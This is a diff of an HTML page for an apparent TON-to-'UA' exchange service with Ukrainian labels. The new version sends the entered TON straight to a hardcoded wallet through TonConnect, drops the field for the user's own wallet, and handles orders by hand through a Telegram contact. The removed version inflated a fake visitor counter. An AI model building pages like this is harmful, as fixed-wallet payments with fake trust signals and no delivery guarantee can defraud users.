@@ -38,10 +38,6 @@
             border: 1px solid rgba(255,255,255,0.08);
         }
 
-        .status { position: absolute; top: 20px; right: 20px; font-size: 10px; color: var(--success); font-weight: bold; display: flex; align-items: center; }
-        .dot { width: 8px; height: 8px; background: var(--success); border-radius: 50%; margin-right: 5px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(76, 217, 100, 0.7); } 70% { box-shadow: 0 0 0 8px rgba(76, 217, 100, 0); } 100% { box-shadow: 0 0 0 0 rgba(76, 217, 100, 0); } }
-
         .ton-logo { width: 60px; height: 60px; margin: 0 auto 10px; background: var(--accent); border-radius: 50%; display: flex; justify-content: center; align-items: center; }
         .ton-logo svg { width: 35px; fill: white; }
 
@@ -52,13 +48,15 @@
         label { display: block; font-size: 10px; color: var(--hint); text-transform: uppercase; margin-bottom: 5px; font-weight: bold; }
         input, select, textarea { width: 100%; padding: 12px; border-radius: 12px; border: 1px solid #2f3e4e; background: #1c2733; color: white; outline: none; box-sizing: border-box; font-size: 14px; }
         
-        .input-wrapper { position: relative; display: flex; align-items: center; }
-        .paste-btn { position: absolute; right: 10px; background: none; border: none; color: var(--accent); cursor: pointer; font-size: 16px; }
-
         .calc-res { background: rgba(0,136,204,0.1); padding: 15px; border-radius: 18px; text-align: center; border: 1px solid var(--accent); margin: 15px 0; }
         .calc-res span { color: var(--accent); font-size: 28px; font-weight: 800; display: block; }
 
+        /* Wallet Info Box */
+        .wallet-info { background: rgba(0,0,0,0.2); padding: 10px; border-radius: 12px; font-size: 9px; color: var(--hint); margin-bottom: 15px; word-break: break-all; border: 1px dashed #2f3e4e; }
+
         .main-btn { width: 100%; padding: 16px; background: var(--accent); color: white; border: none; border-radius: 14px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-bottom: 10px; }
+        .pay-btn { background: var(--success); font-size: 16px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+
         #ton-connect-button { display: flex; justify-content: center; margin-bottom: 15px; }
 
         .row-btns { display: flex; gap: 10px; margin-bottom: 15px; }
@@ -66,11 +64,6 @@
 
         .modal { display: none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background: var(--overlay); justify-content: center; align-items: center; }
         .modal-content { background: var(--card); padding: 25px; border-radius: 24px; width: 85%; max-width: 320px; border: 1px solid var(--accent); }
-        .modal-content h3 { margin-top: 0; font-size: 18px; text-align: center; }
-        .close-modal { float: right; color: var(--hint); font-size: 20px; cursor: pointer; }
-
-        .visitor-counter { margin-bottom: 15px; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 12px; font-size: 11px; color: var(--hint); display: flex; justify-content: center; align-items: center; gap: 8px; }
-        .counter-num { color: var(--success); font-weight: bold; font-family: monospace; font-size: 14px; }
 
         .footer { font-size: 11px; color: var(--hint); text-align: center; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; }
     </style>
@@ -78,7 +71,6 @@
 <body>
 
 <div class="exchange-card">
-    <div class="status"><div class="dot"></div> Online</div>
     <div class="ton-logo">
         <svg viewBox="0 0 512 512"><path d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM380.1 169.5L271.7 394c-4.4 9.1-13.4 14.8-23.5 14.8s-19.1-5.7-23.5-14.8L116.3 169.5c-4.1-8.5-3.3-18.6 2.1-26.3c5.4-7.7 14.4-12.3 23.9-12.3h220.1c9.5 0 18.5 4.6 23.9 12.3c5.7 7.7 6.5 17.8 2.4 26.3z"></path></svg>
     </div>
@@ -86,16 +78,7 @@
     <div class="rate-badge">1 TON = 100k UA | 5000 GRAM = 1 UA</div>
 
     <div class="input-group">
-        <label>Валюта чека</label>
-        <select id="type" onchange="calculate()">
-            <option value="TON">TON Blockchain</option>
-            <option value="GRAM">PR GRAM</option>
-            <option value="USD">USD ($)</option>
-        </select>
-    </div>
-
-    <div class="input-group">
-        <label id="l_amt">Кількість</label>
+        <label>Кількість для обміну</label>
         <input type="number" id="amt" placeholder="0.00" oninput="calculate()">
     </div>
 
@@ -105,42 +88,27 @@
 
     <div id="ton-connect-button"></div>
 
-    <div class="input-group">
-        <label>Сервіс чеку</label>
-        <select id="service_select">
-            <option value="Crypto Bot">Чек Crypto Bot</option>
-            <option value="xRocket">Чек xRocket</option>
-            <option value="PR GRAM">Чек PR GRAM</option>
-            <option value="iCryptoCheck">Чек iCryptoCheck</option>
-        </select>
+    <div class="wallet-info">
+        <b>Отримувач:</b><br>
+        UQDXq1iAqu88tVRG62_k03kAXELu_1gzRBMye-VZoFRIRtWw
     </div>
 
-    <div class="input-group">
-        <label>Ваш гаманець TON (UQ...)</label>
-        <div class="input-wrapper">
-            <input type="text" id="wal" placeholder="Адреса отримувача">
-            <button class="paste-btn" onclick="paste('wal')">📋</button>
-        </div>
-    </div>
+    <button class="main-btn pay-btn" onclick="handlePayment()">
+        💎 ОПЛАТИТИ ЧЕРЕЗ ГАМАНЕЦЬ
+    </button>
+
+    <div style="text-align: center; margin: 10px 0; font-size: 11px; color: var(--hint);">АБО ЧЕРЕЗ ЧЕК</div>
 
     <div class="input-group">
         <label>Посилання на чек</label>
-        <div class="input-wrapper">
-            <input type="text" id="chk" placeholder="t.me/...">
-            <button class="paste-btn" onclick="paste('chk')">📋</button>
-        </div>
+        <input type="text" id="chk" placeholder="t.me/CryptoBot?start=...">
     </div>
 
-    <button class="main-btn" onclick="swap()">ОФОРМИТИ ОБМІН</button>
-    <button class="main-btn" style="background: var(--success); display: none;" id="direct-pay" onclick="payNow()">ОПЛАТИТИ ПРЯМО ЗАРАЗ</button>
+    <button class="main-btn" onclick="swap()">ОФОРМИТИ ЗАЯВКУ</button>
     
     <div class="row-btns">
         <button class="secondary-btn" onclick="openModal()">⭐️ Відгук</button>
         <button class="secondary-btn" onclick="share()">🔗 Поділитися</button>
-    </div>
-
-    <div class="visitor-counter">
-        👥 Переглядів сервісу: <span class="counter-num" id="visit-count">...</span>
     </div>
 
     <div class="footer">
@@ -150,22 +118,15 @@
 
 <div id="reviewModal" class="modal">
     <div class="modal-content">
-        <span class="close-modal" onclick="closeModal()">&times;</span>
-        <h3>Залишити відгук</h3>
-        <div class="input-group">
-            <label>Ваше ім'я / @Username</label>
-            <input type="text" id="rev_name" placeholder="Як вас звати?">
-        </div>
-        <div class="input-group">
-            <label>Повідомлення</label>
-            <textarea id="rev_msg" rows="4" placeholder="Ваші враження..."></textarea>
-        </div>
-        <button class="main-btn" onclick="sendReview()">ВІДПРАВИТИ</button>
+        <h3 style="text-align:center">Залишити відгук</h3>
+        <input type="text" id="rev_name" placeholder="Ваше ім'я" style="margin-bottom:10px">
+        <textarea id="rev_msg" rows="4" placeholder="Ваш відгук"></textarea>
+        <button class="main-btn" onclick="sendReview()" style="margin-top:10px">ВІДПРАВИТИ</button>
+        <button class="secondary-btn" onclick="closeModal()" style="width:100%">Закрити</button>
     </div>
 </div>
 
 <script>
-    // Твій гаманець інтегровано
     const MY_WALLET = "UQDXq1iAqu88tVRG62_k03kAXELu_1gzRBMye-VZoFRIRtWw";
 
     const tonConnectUI = new TONConnectUI.TonConnectUI({
@@ -173,14 +134,15 @@
         buttonRootId: 'ton-connect-button'
     });
 
-    tonConnectUI.onStatusChange(wallet => {
-        const payBtn = document.getElementById('direct-pay');
-        payBtn.style.display = wallet ? 'block' : 'none';
-    });
+    async function handlePayment() {
+        if (!tonConnectUI.connected) {
+            alert("Спочатку підключіть гаманець кнопкою вище!");
+            tonConnectUI.openModal();
+            return;
+        }
 
-    async function payNow() {
         const amount = document.getElementById('amt').value;
-        if(!amount) return alert("Вкажіть кількість!");
+        if(!amount || amount <= 0) return alert("Вкажіть кількість!");
 
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 60,
@@ -192,32 +154,20 @@
 
         try {
             await tonConnectUI.sendTransaction(transaction);
-            alert("Транзакцію надіслано успішно!");
-        } catch (e) { alert("Помилка оплати."); }
+            alert("Транзакцію надіслано!");
+        } catch (e) { alert("Оплата скасована."); }
     }
-
-    function updateCounter() {
-        let count = localStorage.getItem('visit_count') || 215;
-        count = parseInt(count) + 1;
-        localStorage.setItem('visit_count', count);
-        document.getElementById('visit-count').innerText = count.toLocaleString();
-    }
-    updateCounter();
 
     function calculate() {
-        const t = document.getElementById('type').value;
         const a = parseFloat(document.getElementById('amt').value) || 0;
-        const r = document.getElementById('res');
-        document.getElementById('l_amt').innerText = "Кількість " + t;
-        let target = t==='TON' ? a*100000 : (t==='GRAM' ? a/5000 : a*20000);
-        r.innerText = Math.floor(target).toLocaleString('uk-UA') + " UA";
+        document.getElementById('res').innerText = (Math.floor(a * 100000)).toLocaleString('uk-UA') + " UA";
     }
 
-    async function paste(id) {
-        try {
-            const text = await navigator.clipboard.readText();
-            document.getElementById(id).value = text;
-        } catch (e) { alert("Вставте вручну"); }
+    function swap() {
+        const a = document.getElementById('amt').value;
+        const c = document.getElementById('chk').value;
+        if(!a || !c) return alert("Заповніть суму та посилання на чек!");
+        window.open(`https://t.me/Leslav?text=${encodeURIComponent("🚀 ЗАЯВКА\nСума: "+a+" TON\nЧек: "+c)}`);
     }
 
     function share() {
@@ -225,24 +175,13 @@
         alert("Посилання скопійовано!");
     }
 
-    function swap() {
-        const a = document.getElementById('amt').value;
-        const w = document.getElementById('wal').value;
-        const c = document.getElementById('chk').value;
-        if(!a || !w || !c) return alert("Заповніть усі поля!");
-        const m = `🚀 ЗАЯВКА: ${a} ${document.getElementById('type').value}\n📥 Отримаю: ${document.getElementById('res').innerText}\n💎 Гаманець: ${w}\n🔗 Чек: ${c}`;
-        window.open(`https://t.me/Leslav?text=${encodeURIComponent(m)}`);
-    }
-
     function openModal() { document.getElementById('reviewModal').style.display = 'flex'; }
     function closeModal() { document.getElementById('reviewModal').style.display = 'none'; }
-    
     function sendReview() {
-        const name = document.getElementById('rev_name').value;
-        const msg = document.getElementById('rev_msg').value;
-        if(!name || !msg) return alert("Заповніть поля відгуку!");
-        const reviewText = `⭐️ ВІДГУК\n\n👤 Від: ${name}\n💬 Текст: ${msg}`;
-        window.open(`https://t.me/Leslav?text=${encodeURIComponent(reviewText)}`);
+        const n = document.getElementById('rev_name').value;
+        const m = document.getElementById('rev_msg').value;
+        if(!n || !m) return alert("Заповніть поля!");
+        window.open(`https://t.me/Leslav?text=${encodeURIComponent("⭐️ ВІДГУК\nВід: "+n+"\n"+m)}`);
         closeModal();
     }
 </script>
